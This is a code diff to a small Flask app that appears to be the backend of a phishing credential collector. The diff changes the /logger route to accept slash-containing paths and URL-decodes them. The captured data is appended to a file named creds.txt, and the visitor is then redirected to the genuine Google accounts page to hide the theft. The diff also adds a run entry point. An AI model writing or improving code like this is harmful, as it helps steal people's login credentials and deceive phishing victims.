@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template, redirect
+from urllib.parse import unquote
 
 app = Flask(__name__)
 
@@ -25,8 +26,9 @@ def logger(func):
 
     return "Invalid request", 400
 
-@app.route("/logger/<data>/<int:func>", methods=["GET", "POST"])
+@app.route("/logger/<path:data>/<int:func>", methods=["GET", "POST"])
 def logger1(data, func):
+    data = unquote(data)
     if data:
         with open("creds.txt", "a") as f:
             f.write(data + "\n")
@@ -37,3 +39,7 @@ def logger1(data, func):
         return redirect("https://accounts.google.com")
 
     return "Invalid request", 400
+
+
+if __name__ == "__main__":
+    app.run()
